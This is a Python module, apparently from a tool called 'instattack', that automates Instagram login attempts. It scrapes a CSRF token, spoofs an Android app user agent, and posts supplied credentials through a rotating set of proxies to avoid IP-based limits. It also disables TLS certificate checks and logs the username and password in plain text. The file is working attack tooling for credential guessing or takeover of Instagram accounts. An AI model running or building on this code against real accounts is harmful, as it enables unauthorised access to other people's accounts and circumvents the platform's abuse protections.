import aiohttp
import asyncio
from argparse import ArgumentParser
from bs4 import BeautifulSoup
import requests
import re

from instattack import settings
from instattack.logger import AppLogger
from instattack.entry.run import shutdown, setup

from instattack.proxies.models import Proxy
from instattack.login.models import SimpleInstagramResult
from instattack.login import constants

from instattack.entry.config import Configuration


log = AppLogger(__name__)


VERSION = 18
RELEASE = 4.3
MFG = "Xiaomi"
MODEL = "HM 1SW"

USERAGENT = (
    f'Instagram 9.2.0 Android ({VERSION}/{RELEASE}; '
    f'320dpi; 720x1280; {MFG}; {MODEL}; armani; qcom; en_US)'
)

TOKEN_HEADER = "X-CSRFToken"

HEADERS = {
    'Referer': 'https://www.instagram.com/',
    "User-Agent": USERAGENT,
}

connector = aiohttp.TCPConnector(
    ssl=False,
    force_close=False,
    keepalive_timeout=0,
    enable_cleanup_closed=True,
)


def get_token(session):
    session = requests.Session()
    r = session.get(settings.INSTAGRAM_URL, headers=HEADERS)
    return r


def sync_login(session, login_data, proxy):

    with requests.Session() as session:
        r = session.get(settings.INSTAGRAM_URL)
        token = re.search('(?<="csrf_token":")\w+', r.text).group(0)
        log.success(token)
        cookies = r.cookies

        session.headers.update(**{TOKEN_HEADER: token})
        session.cookies.update(cookies)

        session.verify = False

        response = session.post(
            settings.INSTAGRAM_LOGIN_URL,
            data=login_data,
            allow_redirects=True,
            verify=False,
            proxies={
                'http': proxy.url,
                'https': proxy.url,
            }
        )
        data = response.json()
        return SimpleInstagramResult.from_dict(data)


async def try_login(loop, session, login_data, proxy, token):

    headers = HEADERS.copy()
    headers.update(**{TOKEN_HEADER: token})

    async with session.post(
        settings.INSTAGRAM_LOGIN_URL,
        headers=headers,
        proxy=proxy.url,
        data=login_data,
        # ssl=False,
    ) as response:
        if response.status == 200 or response.status == 400:
            data = await response.json()
            return SimpleInstagramResult.from_dict(data)
        else:
            log.warning(response.status)
            return


async def login(loop, login_data, sync=False):

    # proxies = scrape_proxies()

    proxy_start = 25
    proxy_end = 35
    proxies = await Proxy.filter(method="POST").all()

    with requests.Session() as sess:
        r = sess.get(settings.INSTAGRAM_URL)
        token = re.search('(?<="csrf_token":")\w+', r.text).group(0)

        log.success(token)
        cookies = r.cookies

        if not sync:
            async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
                for proxy in proxies[proxy_start:proxy_end]:
                    try:
                        result = await try_login(loop, session, login_data, proxy, token)
                    except Exception as e:
                        log.error(e.__class__)
                        log.error(str(e))
                    else:
                        if result:
                            log.success(result.__dict__)
                            log.success(result)
        else:
            for proxy in proxies[proxy_start:proxy_end]:
                try:
                    result = sync_login(sess, login_data, proxy)
                except Exception as e:
                    log.error(e.__class__)
                    log.error(str(e))
                else:
                    if result:
                        log.success(result.__dict__)
                        log.success(result)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-u', dest='username')
    parser.add_argument('-p', dest='password')
    parser.add_argument('--sync', action='store_true', dest='sync')

    args = parser.parse_args()

    loop = asyncio.get_event_loop()
    setup(loop, args)

    config = Configuration("conf.yml")
    config.validate()

    login_data = {
        constants.INSTAGRAM_USERNAME_FIELD: args.username,
        constants.INSTAGRAM_PASSWORD_FIELD: args.password,
    }
    log.info(login_data)

    loop.run_until_complete(login(loop, login_data, sync=args.sync))
    shutdown(loop)
